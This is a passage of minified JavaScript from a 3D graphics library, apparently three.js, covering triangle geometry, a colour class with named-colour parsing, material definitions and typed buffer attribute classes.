0===i&&(i=new he),0===u)return i.set(-2,-1,-1);var d=1/u,p=(l*s-o*c)*d,h=(a*c-o*s)*d;return i.set(1-p-h,h,p)},e.containsPoint=function(e,t,n,r){return this.getBarycoord(e,t,n,r,bt),0<=bt.x&&0<=bt.y&&bt.x+bt.y<=1},e.getUV=function(e,t,n,r,i,a,o,s){return this.getBarycoord(e,t,n,r,bt),s.set(0,0),s.addScaledVector(i,bt.x),s.addScaledVector(a,bt.y),s.addScaledVector(o,bt.z),s},e.isFrontFacing=function(e,t,n,r){return vt.subVectors(n,t),gt.subVectors(e,t),vt.cross(gt).dot(r)<0};var t=e.prototype;return t.set=function(e,t,n){return this.a.copy(e),this.b.copy(t),this.c.copy(n),this},t.setFromPointsAndIndices=function(e,t,n,r){return this.a.copy(e[t]),this.b.copy(e[n]),this.c.copy(e[r]),this},t.clone=function(){return(new this.constructor).copy(this)},t.copy=function(e){return this.a.copy(e.a),this.b.copy(e.b),this.c.copy(e.c),this},t.getArea=function(){return vt.subVectors(this.c,this.b),gt.subVectors(this.a,this.b),.5*vt.cross(gt).length()},t.getMidpoint=function(e){return void 0===e&&(e=new he),e.addVectors(this.a,this.b).add(this.c).multiplyScalar(1/3)},t.getNormal=function(t){return e.getNormal(this.a,this.b,this.c,t)},t.getPlane=function(e){return void 0===e&&(e=new mt),e.setFromCoplanarPoints(this.a,this.b,this.c)},t.getBarycoord=function(t,n){return e.getBarycoord(t,this.a,this.b,this.c,n)},t.getUV=function(t,n,r,i,a){return e.getUV(t,this.a,this.b,this.c,n,r,i,a)},t.containsPoint=function(t){return e.containsPoint(t,this.a,this.b,this.c)},t.isFrontFacing=function(t){return e.isFrontFacing(this.a,this.b,this.c,t)},t.intersectsBox=function(e){return e.intersectsTriangle(this)},t.closestPointToPoint=function(e,t){void 0===t&&(t=new he);var n,r,i=this.a,a=this.b,o=this.c;_t.subVectors(a,i),wt.subVectors(o,i),xt.subVectors(e,i);var s=_t.dot(xt),l=wt.dot(xt);if(s<=0&&l<=0)return t.copy(i);St.subVectors(e,a);var c=_t.dot(St),u=wt.dot(St);if(0<=c&&u<=c)return t.copy(a);var d=s*u-c*l;if(d<=0&&0<=s&&c<=0)return n=s/(s-c),t.copy(i).addScaledVector(_t,n);kt.subVectors(e,o);var p=_t.dot(kt),h=wt.dot(kt);if(0<=h&&p<=h)return t.copy(o);var f=p*l-s*h;if(f<=0&&0<=l&&h<=0)return r=l/(l-h),t.copy(i).addScaledVector(wt,r);var A=c*h-p*u;if(A<=0&&0<=u-c&&0<=p-h)return Ct.subVectors(o,a),r=(u-c)/(u-c+(p-h)),t.copy(a).addScaledVector(Ct,r);var m=1/(A+f+d);return n=f*m,r=d*m,t.copy(i).addScaledVector(_t,n).addScaledVector(wt,r)},t.equals=function(e){return e.a.equals(this.a)&&e.b.equals(this.b)&&e.c.equals(this.c)},e}(),Bt={aliceblue:15792383,antiquewhite:16444375,aqua:65535,aquamarine:8388564,azure:15794175,beige:16119260,bisque:16770244,black:0,blanchedalmond:16772045,blue:255,blueviolet:9055202,brown:10824234,burlywood:14596231,cadetblue:6266528,chartreuse:8388352,chocolate:13789470,coral:16744272,cornflowerblue:6591981,cornsilk:16775388,crimson:14423100,cyan:65535,darkblue:139,darkcyan:35723,darkgoldenrod:12092939,darkgray:11119017,darkgreen:25600,darkgrey:11119017,darkkhaki:12433259,darkmagenta:9109643,darkolivegreen:5597999,darkorange:16747520,darkorchid:10040012,darkred:9109504,darksalmon:15308410,darkseagreen:9419919,darkslateblue:4734347,darkslategray:3100495,darkslategrey:3100495,darkturquoise:52945,darkviolet:9699539,deeppink:16716947,deepskyblue:49151,dimgray:6908265,dimgrey:6908265,dodgerblue:2003199,firebrick:11674146,floralwhite:16775920,forestgreen:2263842,fuchsia:16711935,gainsboro:14474460,ghostwhite:16316671,gold:16766720,goldenrod:14329120,gray:8421504,green:32768,greenyellow:11403055,grey:8421504,honeydew:15794160,hotpink:16738740,indianred:13458524,indigo:4915330,ivory:16777200,khaki:15787660,lavender:15132410,lavenderblush:16773365,lawngreen:8190976,lemonchiffon:16775885,lightblue:11393254,lightcoral:15761536,lightcyan:14745599,lightgoldenrodyellow:16448210,lightgray:13882323,lightgreen:9498256,lightgrey:13882323,lightpink:16758465,lightsalmon:16752762,lightseagreen:2142890,lightskyblue:8900346,lightslategray:7833753,lightslategrey:7833753,lightsteelblue:11584734,lightyellow:16777184,lime:65280,limegreen:3329330,linen:16445670,magenta:16711935,maroon:8388608,mediumaquamarine:6737322,mediumblue:205,mediumorchid:12211667,mediumpurple:9662683,mediumseagreen:3978097,mediumslateblue:8087790,mediumspringgreen:64154,mediumturquoise:4772300,mediumvioletred:13047173,midnightblue:1644912,mintcream:16121850,mistyrose:16770273,moccasin:16770229,navajowhite:16768685,navy:128,oldlace:16643558,olive:8421376,olivedrab:7048739,orange:16753920,orangered:16729344,orchid:14315734,palegoldenrod:15657130,palegreen:10025880,paleturquoise:11529966,palevioletred:14381203,papayawhip:16773077,peachpuff:16767673,peru:13468991,pink:16761035,plum:14524637,powderblue:11591910,purple:8388736,rebeccapurple:6697881,red:16711680,rosybrown:12357519,royalblue:4286945,saddlebrown:9127187,salmon:16416882,sandybrown:16032864,seagreen:3050327,seashell:16774638,sienna:10506797,silver:12632256,skyblue:8900331,slateblue:6970061,slategray:7372944,slategrey:7372944,snow:16775930,springgreen:65407,steelblue:4620980,tan:13808780,teal:32896,thistle:14204888,tomato:16737095,turquoise:4251856,violet:15631086,wheat:16113331,white:16777215,whitesmoke:16119285,yellow:16776960,yellowgreen:10145074},Et={h:0,s:0,l:0},Tt={h:0,s:0,l:0};function Pt(e,t,n){return n<0&&(n+=1),1<n&&(n-=1),n<1/6?e+6*(t-e)*n:n<.5?t:n<2/3?e+6*(t-e)*(2/3-n):e}function It(e){return e<.04045?.0773993808*e:Math.pow(.9478672986*e+.0521327014,2.4)}function Ft(e){return e<.0031308?12.92*e:1.055*Math.pow(e,.41666)-.055}var Lt=function(){function e(e,t,n){return Object.defineProperty(this,"isColor",{value:!0}),void 0===t&&void 0===n?this.set(e):this.setRGB(e,t,n)}var t=e.prototype;return t.set=function(e){return e&&e.isColor?this.copy(e):"number"==typeof e?this.setHex(e):"string"==typeof e&&this.setStyle(e),this},t.setScalar=function(e){return this.r=e,this.g=e,this.b=e,this},t.setHex=function(e){return e=Math.floor(e),this.r=(e>>16&255)/255,this.g=(e>>8&255)/255,this.b=(255&e)/255,this},t.setRGB=function(e,t,n){return this.r=e,this.g=t,this.b=n,this},t.setHSL=function(e,t,n){if(e=J.euclideanModulo(e,1),t=J.clamp(t,0,1),n=J.clamp(n,0,1),0===t)this.r=this.g=this.b=n;else{var r=n<=.5?n*(1+t):n+t-n*t,i=2*n-r;this.r=Pt(i,r,e+1/3),this.g=Pt(i,r,e),this.b=Pt(i,r,e-1/3)}return this},t.setStyle=function(e){function t(e){void 0!==e&&parseFloat(e)}var n;if(n=/^((?:rgb|hsl)a?)\(\s*([^\)]*)\)/.exec(e)){var r,i=n[1],a=n[2];switch(i){case"rgb":case"rgba":if(r=/^(\d+)\s*,\s*(\d+)\s*,\s*(\d+)\s*(,\s*([0-9]*\.?[0-9]+)\s*)?$/.exec(a))return this.r=Math.min(255,parseInt(r[1],10))/255,this.g=Math.min(255,parseInt(r[2],10))/255,this.b=Math.min(255,parseInt(r[3],10))/255,t(r[5]),this;if(r=/^(\d+)\%\s*,\s*(\d+)\%\s*,\s*(\d+)\%\s*(,\s*([0-9]*\.?[0-9]+)\s*)?$/.exec(a))return this.r=Math.min(100,parseInt(r[1],10))/100,this.g=Math.min(100,parseInt(r[2],10))/100,this.b=Math.min(100,parseInt(r[3],10))/100,t(r[5]),this;break;case"hsl":case"hsla":if(r=/^([0-9]*\.?[0-9]+)\s*,\s*(\d+)\%\s*,\s*(\d+)\%\s*(,\s*([0-9]*\.?[0-9]+)\s*)?$/.exec(a)){var o=parseFloat(r[1])/360,s=parseInt(r[2],10)/100,l=parseInt(r[3],10)/100;return t(r[5]),this.setHSL(o,s,l)}}}else if(n=/^\#([A-Fa-f0-9]+)$/.exec(e)){var c=n[1],u=c.length;if(3===u)return this.r=parseInt(c.charAt(0)+c.charAt(0),16)/255,this.g=parseInt(c.charAt(1)+c.charAt(1),16)/255,this.b=parseInt(c.charAt(2)+c.charAt(2),16)/255,this;if(6===u)return this.r=parseInt(c.charAt(0)+c.charAt(1),16)/255,this.g=parseInt(c.charAt(2)+c.charAt(3),16)/255,this.b=parseInt(c.charAt(4)+c.charAt(5),16)/255,this}return e&&0<e.length?this.setColorName(e):this},t.setColorName=function(e){var t=Bt[e];return void 0!==t&&this.setHex(t),this},t.clone=function(){return new this.constructor(this.r,this.g,this.b)},t.copy=function(e){return this.r=e.r,this.g=e.g,this.b=e.b,this},t.copyGammaToLinear=function(e,t){return void 0===t&&(t=2),this.r=Math.pow(e.r,t),this.g=Math.pow(e.g,t),this.b=Math.pow(e.b,t),this},t.copyLinearToGamma=function(e,t){void 0===t&&(t=2);var n=0<t?1/t:1;return this.r=Math.pow(e.r,n),this.g=Math.pow(e.g,n),this.b=Math.pow(e.b,n),this},t.convertGammaToLinear=function(e){return this.copyGammaToLinear(this,e),this},t.convertLinearToGamma=function(e){return this.copyLinearToGamma(this,e),this},t.copySRGBToLinear=function(e){return this.r=It(e.r),this.g=It(e.g),this.b=It(e.b),this},t.copyLinearToSRGB=function(e){return this.r=Ft(e.r),this.g=Ft(e.g),this.b=Ft(e.b),this},t.convertSRGBToLinear=function(){return this.copySRGBToLinear(this),this},t.convertLinearToSRGB=function(){return this.copyLinearToSRGB(this),this},t.getHex=function(){return 255*this.r<<16^255*this.g<<8^255*this.b<<0},t.getHexString=function(){return("000000"+this.getHex().toString(16)).slice(-6)},t.getHSL=function(e){void 0===e&&(e={h:0,s:0,l:0});var t,n,r=this.r,i=this.g,a=this.b,o=Math.max(r,i,a),s=Math.min(r,i,a),l=(s+o)/2;if(s===o)n=t=0;else{var c=o-s;switch(n=l<=.5?c/(o+s):c/(2-o-s),o){case r:t=(i-a)/c+(i<a?6:0);break;case i:t=(a-r)/c+2;break;case a:t=(r-i)/c+4}t/=6}return e.h=t,e.s=n,e.l=l,e},t.getStyle=function(){return"rgb("+(255*this.r|0)+","+(255*this.g|0)+","+(255*this.b|0)+")"},t.offsetHSL=function(e,t,n){return this.getHSL(Et),Et.h+=e,Et.s+=t,Et.l+=n,this.setHSL(Et.h,Et.s,Et.l),this},t.add=function(e){return this.r+=e.r,this.g+=e.g,this.b+=e.b,this},t.addColors=function(e,t){return this.r=e.r+t.r,this.g=e.g+t.g,this.b=e.b+t.b,this},t.addScalar=function(e){return this.r+=e,this.g+=e,this.b+=e,this},t.sub=function(e){return this.r=Math.max(0,this.r-e.r),this.g=Math.max(0,this.g-e.g),this.b=Math.max(0,this.b-e.b),this},t.multiply=function(e){return this.r*=e.r,this.g*=e.g,this.b*=e.b,this},t.multiplyScalar=function(e){return this.r*=e,this.g*=e,this.b*=e,this},t.lerp=function(e,t){return this.r+=(e.r-this.r)*t,this.g+=(e.g-this.g)*t,this.b+=(e.b-this.b)*t,this},t.lerpHSL=function(e,t){this.getHSL(Et),e.getHSL(Tt);var n=J.lerp(Et.h,Tt.h,t),r=J.lerp(Et.s,Tt.s,t),i=J.lerp(Et.l,Tt.l,t);return this.setHSL(n,r,i),this},t.equals=function(e){return e.r===this.r&&e.g===this.g&&e.b===this.b},t.fromArray=function(e,t){return void 0===t&&(t=0),this.r=e[t],this.g=e[t+1],this.b=e[t+2],this},t.toArray=function(e,t){return void 0===e&&(e=[]),void 0===t&&(t=0),e[t]=this.r,e[t+1]=this.g,e[t+2]=this.b,e},t.fromBufferAttribute=function(e,t){return this.r=e.getX(t),this.g=e.getY(t),this.b=e.getZ(t),!0===e.normalized&&(this.r/=255,this.g/=255,this.b/=255),this},t.toJSON=function(){return this.getHex()},e}();Lt.NAMES=Bt,Lt.prototype.r=1,Lt.prototype.g=1,Lt.prototype.b=1;var Ot=function(){function e(e,t,n,r,i,a){this.a=e,this.b=t,this.c=n,this.normal=r&&r.isVector3?r:new he,this.vertexNormals=Array.isArray(r)?r:[],this.color=i&&i.isColor?i:new Lt,this.vertexColors=Array.isArray(i)?i:[],this.materialIndex=void 0!==a?a:0}var t=e.prototype;return t.clone=function(){return(new this.constructor).copy(this)},t.copy=function(e){this.a=e.a,this.b=e.b,this.c=e.c,this.normal.copy(e.normal),this.color.copy(e.color),this.materialIndex=e.materialIndex;for(var t=0,n=e.vertexNormals.length;t<n;t++)this.vertexNormals[t]=e.vertexNormals[t].clone();for(var r=0,i=e.vertexColors.length;r<i;r++)this.vertexColors[r]=e.vertexColors[r].clone();return this},e}(),Nt=0;function Dt(){Object.defineProperty(this,"id",{value:Nt++}),this.uuid=J.generateUUID(),this.name="",this.type="Material",this.fog=!0,this.blending=1,this.side=0,this.flatShading=!1,this.vertexColors=!1,this.opacity=1,this.transparent=!1,this.blendSrc=204,this.blendDst=205,this.blendEquation=t,this.blendSrcAlpha=null,this.blendDstAlpha=null,this.blendEquationAlpha=null,this.depthFunc=3,this.depthTest=!0,this.depthWrite=!0,this.stencilWriteMask=255,this.stencilFunc=519,this.stencilRef=0,this.stencilFuncMask=255,this.stencilFail=V,this.stencilZFail=V,this.stencilZPass=V,this.stencilWrite=!1,this.clippingPlanes=null,this.clipIntersection=!1,this.clipShadows=!1,this.shadowSide=null,this.colorWrite=!0,this.precision=null,this.polygonOffset=!1,this.polygonOffsetFactor=0,this.polygonOffsetUnits=0,this.dithering=!1,this.alphaTest=0,this.premultipliedAlpha=!1,this.visible=!0,this.toneMapped=!0,this.userData={},this.version=0}function Rt(e){Dt.call(this),this.type="MeshBasicMaterial",this.color=new Lt(16777215),this.map=null,this.lightMap=null,this.lightMapIntensity=1,this.aoMap=null,this.aoMapIntensity=1,this.specularMap=null,this.alphaMap=null,this.envMap=null,this.combine=0,this.reflectivity=1,this.refractionRatio=.98,this.wireframe=!1,this.wireframeLinewidth=1,this.wireframeLinecap="round",this.wireframeLinejoin="round",this.skinning=!1,this.morphTargets=!1,this.setValues(e)}Dt.prototype=Object.assign(Object.create(K.prototype),{constructor:Dt,isMaterial:!0,onBeforeCompile:function(){},customProgramCacheKey:function(){return this.onBeforeCompile.toString()},setValues:function(e){if(void 0!==e)for(var t in e){var n=e[t];if(void 0!==n)if("shading"!==t){var r=this[t];void 0!==r&&(r&&r.isColor?r.set(n):r&&r.isVector3&&n&&n.isVector3?r.copy(n):this[t]=n)}else this.flatShading=1===n}},toJSON:function(e){var t=void 0===e||"string"==typeof e;t&&(e={textures:{},images:{}});var n={metadata:{version:4.5,type:"Material",generator:"Material.toJSON"}};function r(e){var t=[];for(var n in e){var r=e[n];delete r.metadata,t.push(r)}return t}if(n.uuid=this.uuid,n.type=this.type,""!==this.name&&(n.name=this.name),this.color&&this.color.isColor&&(n.color=this.color.getHex()),void 0!==this.roughness&&(n.roughness=this.roughness),void 0!==this.metalness&&(n.metalness=this.metalness),this.sheen&&this.sheen.isColor&&(n.sheen=this.sheen.getHex()),this.emissive&&this.emissive.isColor&&(n.emissive=this.emissive.getHex()),this.emissiveIntensity&&1!==this.emissiveIntensity&&(n.emissiveIntensity=this.emissiveIntensity),this.specular&&this.specular.isColor&&(n.specular=this.specular.getHex()),void 0!==this.shininess&&(n.shininess=this.shininess),void 0!==this.clearcoat&&(n.clearcoat=this.clearcoat),void 0!==this.clearcoatRoughness&&(n.clearcoatRoughness=this.clearcoatRoughness),this.clearcoatMap&&this.clearcoatMap.isTexture&&(n.clearcoatMap=this.clearcoatMap.toJSON(e).uuid),this.clearcoatRoughnessMap&&this.clearcoatRoughnessMap.isTexture&&(n.clearcoatRoughnessMap=this.clearcoatRoughnessMap.toJSON(e).uuid),this.clearcoatNormalMap&&this.clearcoatNormalMap.isTexture&&(n.clearcoatNormalMap=this.clearcoatNormalMap.toJSON(e).uuid,n.clearcoatNormalScale=this.clearcoatNormalScale.toArray()),this.map&&this.map.isTexture&&(n.map=this.map.toJSON(e).uuid),this.matcap&&this.matcap.isTexture&&(n.matcap=this.matcap.toJSON(e).uuid),this.alphaMap&&this.alphaMap.isTexture&&(n.alphaMap=this.alphaMap.toJSON(e).uuid),this.lightMap&&this.lightMap.isTexture&&(n.lightMap=this.lightMap.toJSON(e).uuid),this.aoMap&&this.aoMap.isTexture&&(n.aoMap=this.aoMap.toJSON(e).uuid,n.aoMapIntensity=this.aoMapIntensity),this.bumpMap&&this.bumpMap.isTexture&&(n.bumpMap=this.bumpMap.toJSON(e).uuid,n.bumpScale=this.bumpScale),this.normalMap&&this.normalMap.isTexture&&(n.normalMap=this.normalMap.toJSON(e).uuid,n.normalMapType=this.normalMapType,n.normalScale=this.normalScale.toArray()),this.displacementMap&&this.displacementMap.isTexture&&(n.displacementMap=this.displacementMap.toJSON(e).uuid,n.displacementScale=this.displacementScale,n.displacementBias=this.displacementBias),this.roughnessMap&&this.roughnessMap.isTexture&&(n.roughnessMap=this.roughnessMap.toJSON(e).uuid),this.metalnessMap&&this.metalnessMap.isTexture&&(n.metalnessMap=this.metalnessMap.toJSON(e).uuid),this.emissiveMap&&this.emissiveMap.isTexture&&(n.emissiveMap=this.emissiveMap.toJSON(e).uuid),this.specularMap&&this.specularMap.isTexture&&(n.specularMap=this.specularMap.toJSON(e).uuid),this.envMap&&this.envMap.isTexture&&(n.envMap=this.envMap.toJSON(e).uuid,n.reflectivity=this.reflectivity,n.refractionRatio=this.refractionRatio,void 0!==this.combine&&(n.combine=this.combine),void 0!==this.envMapIntensity&&(n.envMapIntensity=this.envMapIntensity)),this.gradientMap&&this.gradientMap.isTexture&&(n.gradientMap=this.gradientMap.toJSON(e).uuid),void 0!==this.size&&(n.size=this.size),void 0!==this.sizeAttenuation&&(n.sizeAttenuation=this.sizeAttenuation),1!==this.blending&&(n.blending=this.blending),!0===this.flatShading&&(n.flatShading=this.flatShading),0!==this.side&&(n.side=this.side),this.vertexColors&&(n.vertexColors=!0),this.opacity<1&&(n.opacity=this.opacity),!0===this.transparent&&(n.transparent=this.transparent),n.depthFunc=this.depthFunc,n.depthTest=this.depthTest,n.depthWrite=this.depthWrite,n.stencilWrite=this.stencilWrite,n.stencilWriteMask=this.stencilWriteMask,n.stencilFunc=this.stencilFunc,n.stencilRef=this.stencilRef,n.stencilFuncMask=this.stencilFuncMask,n.stencilFail=this.stencilFail,n.stencilZFail=this.stencilZFail,n.stencilZPass=this.stencilZPass,this.rotation&&0!==this.rotation&&(n.rotation=this.rotation),!0===this.polygonOffset&&(n.polygonOffset=!0),0!==this.polygonOffsetFactor&&(n.polygonOffsetFactor=this.polygonOffsetFactor),0!==this.polygonOffsetUnits&&(n.polygonOffsetUnits=this.polygonOffsetUnits),this.linewidth&&1!==this.linewidth&&(n.linewidth=this.linewidth),void 0!==this.dashSize&&(n.dashSize=this.dashSize),void 0!==this.gapSize&&(n.gapSize=this.gapSize),void 0!==this.scale&&(n.scale=this.scale),!0===this.dithering&&(n.dithering=!0),0<this.alphaTest&&(n.alphaTest=this.alphaTest),!0===this.premultipliedAlpha&&(n.premultipliedAlpha=this.premultipliedAlpha),!0===this.wireframe&&(n.wireframe=this.wireframe),1<this.wireframeLinewidth&&(n.wireframeLinewidth=this.wireframeLinewidth),"round"!==this.wireframeLinecap&&(n.wireframeLinecap=this.wireframeLinecap),"round"!==this.wireframeLinejoin&&(n.wireframeLinejoin=this.wireframeLinejoin),!0===this.morphTargets&&(n.morphTargets=!0),!0===this.morphNormals&&(n.morphNormals=!0),!0===this.skinning&&(n.skinning=!0),!1===this.visible&&(n.visible=!1),!1===this.toneMapped&&(n.toneMapped=!1),"{}"!==JSON.stringify(this.userData)&&(n.userData=this.userData),t){var i=r(e.textures),a=r(e.images);0<i.length&&(n.textures=i),0<a.length&&(n.images=a)}return n},clone:function(){return(new this.constructor).copy(this)},copy:function(e){this.name=e.name,this.fog=e.fog,this.blending=e.blending,this.side=e.side,this.flatShading=e.flatShading,this.vertexColors=e.vertexColors,this.opacity=e.opacity,this.transparent=e.transparent,this.blendSrc=e.blendSrc,this.blendDst=e.blendDst,this.blendEquation=e.blendEquation,this.blendSrcAlpha=e.blendSrcAlpha,this.blendDstAlpha=e.blendDstAlpha,this.blendEquationAlpha=e.blendEquationAlpha,this.depthFunc=e.depthFunc,this.depthTest=e.depthTest,this.depthWrite=e.depthWrite,this.stencilWriteMask=e.stencilWriteMask,this.stencilFunc=e.stencilFunc,this.stencilRef=e.stencilRef,this.stencilFuncMask=e.stencilFuncMask,this.stencilFail=e.stencilFail,this.stencilZFail=e.stencilZFail,this.stencilZPass=e.stencilZPass,this.stencilWrite=e.stencilWrite;var t=e.clippingPlanes,n=null;if(null!==t){var r=t.length;n=new Array(r);for(var i=0;i!==r;++i)n[i]=t[i].clone()}return this.clippingPlanes=n,this.clipIntersection=e.clipIntersection,this.clipShadows=e.clipShadows,this.shadowSide=e.shadowSide,this.colorWrite=e.colorWrite,this.precision=e.precision,this.polygonOffset=e.polygonOffset,this.polygonOffsetFactor=e.polygonOffsetFactor,this.polygonOffsetUnits=e.polygonOffsetUnits,this.dithering=e.dithering,this.alphaTest=e.alphaTest,this.premultipliedAlpha=e.premultipliedAlpha,this.visible=e.visible,this.toneMapped=e.toneMapped,this.userData=JSON.parse(JSON.stringify(e.userData)),this},dispose:function(){this.dispatchEvent({type:"dispose"})}}),Object.defineProperty(Dt.prototype,"needsUpdate",{set:function(e){!0===e&&this.version++}}),((Rt.prototype=Object.create(Dt.prototype)).constructor=Rt).prototype.isMeshBasicMaterial=!0,Rt.prototype.copy=function(e){return Dt.prototype.copy.call(this,e),this.color.copy(e.color),this.map=e.map,this.lightMap=e.lightMap,this.lightMapIntensity=e.lightMapIntensity,this.aoMap=e.aoMap,this.aoMapIntensity=e.aoMapIntensity,this.specularMap=e.specularMap,this.alphaMap=e.alphaMap,this.envMap=e.envMap,this.combine=e.combine,this.reflectivity=e.reflectivity,this.refractionRatio=e.refractionRatio,this.wireframe=e.wireframe,this.wireframeLinewidth=e.wireframeLinewidth,this.wireframeLinecap=e.wireframeLinecap,this.wireframeLinejoin=e.wireframeLinejoin,this.skinning=e.skinning,this.morphTargets=e.morphTargets,this};var jt=new he,Ut=new ie;function $t(e,t,n){if(Array.isArray(e))throw new TypeError("THREE.BufferAttribute: array should be a Typed Array.");this.name="",this.array=e,this.itemSize=t,this.count=void 0!==e?e.length/t:0,this.normalized=!0===n,this.usage=Q,this.updateRange={offset:0,count:-1},this.version=0}function zt(e,t,n){$t.call(this,new Int8Array(e),t,n)}function Ht(e,t,n){$t.call(this,new Uint8Array(e),t,n)}function Vt(e,t,n){$t.call(this,new Uint8ClampedArray(e),t,n)}function Qt(e,t,n){$t.call(this,new Int16Array(e),t,n)}function Gt(e,t,n){$t.call(this,new Uint16Array(e),t,n)}function Wt(e,t,n){$t.call(this,new Int32Array(e),t,n)}function Kt(e,t,n){$t.call(this,new Uint32Array(e),t,n)}function qt(e,t,n){$t.call(this,new Float32Array(e),t,n)}function Xt(e,t,n){$t.call(this,new Float64Array(e),t,n)}Object.defineProperty($t.prototype,"needsUpdate",{set:function(e){!0===e&&this.version++}}),Object.assign($t.prototype,{isBufferAttribute:!0,onUploadCallback:function(){},setUsage:function(e){return this.usage=e,this},copy:function(e){return this.name=e.name,this.array=new e.array.constructor(e.array),this.itemSize=e.itemSize,this.count=e.count,this.normalized=e.normalized,this.usage=e.usage,this},copyAt:function(e,t,n){e*=this.itemSize,n*=t.itemSize;for(var r=0,i=this.itemSize;r<i;r++)this.array[e+r]=t.array[n+r];return this},copyArray:function(e){return this.array.set(e),this},copyColorsArray:function(e){for(var t=this.array,n=0,r=0,i=e.length;r<i;r++){var a=e[r];void 0===a&&(a=new Lt),t[n++]=a.r,t[n++]=a.g,t[n++]=a.b}return this},copyVector2sArray:function(e){for(var t=this.array,n=0,r=0,i=e.length;r<i;r++){var a=e[r];void 0===a&&(a=new ie),t[n++]=a.x,t[n++]=a.y}return this},copyVector3sArray:function(e){for(var t=this.array,n=0,r=0,i=e.length;r<i;r++){var a=e[r];void 0===a&&(a=new he),t[n++]=a.x,t[n++]=a.y,t[n++]=a.z}return this},copyVector4sArray:function(e){for(var t=this.array,n=0,r=0,i=e.length;r<i;r++){var a=e[r];void 0===a&&(a=new ce),t[n++]=a.x,t[n++]=a.y,t[n++]=a.z,t[n++]=a.w}return this},applyMatrix3:function(e){if(2===this.itemSize)for(var t=0,n=this.count;t<n;t++)Ut.fromBufferAttribute(this,t),Ut.applyMatrix3(e),this.setXY(t,Ut.x,Ut.y);else if(3===this.itemSize)for(var r=0,i=this.count;r<i;r++)jt.fromBufferAttribute(this,r),jt.applyMatrix3(e),this.setXYZ(r,jt.x,jt.y,jt.z);return this},applyMatrix4:function(e){for(var t=0,n=this.count;t<n;t++)jt.x=this.getX(t),jt.y=this.getY(t),jt.z=this.getZ(t),jt.applyMatrix4(e),this.setXYZ(t,jt.x,jt.y,jt.z);return this},applyNormalMatrix:function(e){for(var t=0,n=this.count;t<n;t++)jt.x=this.getX(t),jt.y=this.getY(t),jt.z=this.getZ(t),jt.applyNormalMatrix(e),this.setXYZ(t,jt.x,jt.y,jt.z);return this},transformDirection:function(e){for(var t=0,n=this.count;t<n;t++)jt.x=this.getX(t),jt.y=this.getY(t),jt.z=this.getZ(t),jt.transformDirection(e),this.setXYZ(t,jt.x,jt.y,jt.z);return this},set:function(e,t){return void 0===t&&(t=0),this.array.set(e,t),this},getX:function(e){return this.array[e*this.itemSize]},setX:function(e,t){return this.array[e*this.itemSize]=t,this},getY:function(e){return this.array[e*this.itemSize+1]},setY:function(e,t){return this.array[e*this.itemSize+1]=t,this},getZ:function(e){return this.array[e*this.itemSize+2]},setZ:function(e,t){return this.array[e*this.itemSize+2]=t,this},getW:function(e){return this.array[e*this.itemSize+3]},setW:function(e,t){return this.array[e*this.itemSize+3]=t,this},setXY:function(e,t,n){return e*=this.itemSize,this.array[e+0]=t,this.array[e+1]=n,this},setXYZ:function(e,t,n,r){return e*=this.itemSize,this.array[e+0]=t,this.array[e+1]=n,this.array[e+2]=r,this},setXYZW:function(e,t,n,r,i){return e*=this.itemSize,this.array[e+0]=t,this.array[e+1]=n,this.array[e+2]=r,this.array[e+3]=i,this},onUpload:function(e){return this.onUploadCallback=e,this},clone:function(){return new this.constructor(this.array,this.itemSize).copy(this)},toJSON:function(){return{itemSize:this.itemSize,type:this.array.constructor.name,array:Array.prototype.slice.call(this.array),normalized:this.normalized}}}),(zt.prototype=Object.create($t.prototype)).constructor=zt,(Ht.prototype=Object.create($t.prototype)).constructor=Ht,(Vt.prototype=Object.create($t.prototype)).constructor=Vt,(Qt.prototype=Object.create($t.prototype)).constructor=Qt,(Gt.prototype=Object.create($t.prototype)).constructor=Gt,(Wt.prototype=Object.create($t.prototype)).constructor=Wt,(Kt.prototype=Object.create($t.prototype)).constructor=Kt,(qt.prototype=Object.create($t.prototype)).constructor=qt,(Xt.prototype=Object.create($t.prototype)).constructor=Xt;var Yt=function(){function e(){this.vertices=[],this.normals=[],this.colors=[],this.uvs=[],this.uvs2=[],this.groups=[],this.morphTargets={},this.skinWeights=[],this.skinIndices=[],this.boundingBox=null,this.boundingSphere=null,this.verticesNeedUpdate=!1,this.normalsNeedUpdate=!1,this.colorsNeedUpdate=!1,this.uvsNeedUpdate=!1,this.groupsNeedUpdate=!1}var t=e.prototype;return t.computeGroups=function(e){var t,n,r=[],i=void 0,a=e.faces;for(n=0;n<a.length;n++){var o=a[n];o.materialIndex!==i&&(i=o.materialIndex,void 0!==t&&(t.count=3*n-t.start,r.push(t)),t={start:3*n,materialIndex:i})}void 0!==t&&(t.count=3*n-t.start,r.push(t)),this.groups=r},t.fromGeometry=function(e){var t,n=e.faces,r=e.vertices,i=e.faceVertexUvs,a=i[0]&&0<i[0].length,o=i[1]&&0<i[1].length,s=e.morphTargets,l=s.length;if(0<l){t=[];for(var c=0;c<l;c++)t[c]={name:s[c].name,data:[]};this.morphTargets.position=t}var u,d=e.morphNormals,p=d.length;if(0<p){u=[];for(var h=0;h<p;h++)u[h]={name:d[h].name,data:[]};this.morphTargets.normal=u}var f=e.skinIndices,A=e.skinWeights,m=f.length===r.length,v=A.length===r.length;0<r.length&&n.length;for(var g=0;g<n.length;g++){var y=n[g];this.vertices.push(r[y.a],r[y.b],r[y.c]);var b=y.vertexNormals;if(3===b.length)this.normals.push(b[0],b[1],b[2]);else{var _=y.normal;this.normals.push(_,_,_)}var w=y.vertexColors;if(3===w.length)this.colors.push(w[0],w[1],w[2]);else{var C=y.color;this.colors.push(C,C,C)}if(!0===a){var x=i[0][g];void 0!==x?this.uvs.push(x[0],x[1],x[2]):this.uvs.push(new ie,new ie,new ie)}if(!0===o){var S=i[1][g];void 0!==S?this.uvs2.push(S[0],S[1],S[2]):this.uvs2.push(new ie,new ie,new ie)}for(var k=0;k<l;k++){var M=s[k].vertices;t[k].data.push(M[y.a],M[y.b],M[y.c])}for(var B=0;B<p;B++){var E=d[B].vertexNormals[g];u[B].data.push(E.a,E.b,E.c)}m&&this.skinIndices.push(f[y.a],f[y.b],f[y.c]),v&&this.skinWeights.push(A[y.a],A[y.b],A[y.c])}return this.computeGroups(e),this.verticesNeedUpdate=e.verticesNeedUpdate,this.normalsNeedUpdate=e.normalsNeedUpdate,this.colorsNeedUpdate=e.colorsNeedUpdate,this.uvsNeedUpdate=e.uvsNeedUpdate,this.groupsNeedUpdate=e.groupsNeedUpdate,null!==e.boundingSphere&&(this.boundingSphere=e.boundingSphere.clone()),null!==e.boundingBox&&(this.boundingBox=e.boundingBox.clone()),this},e}();function 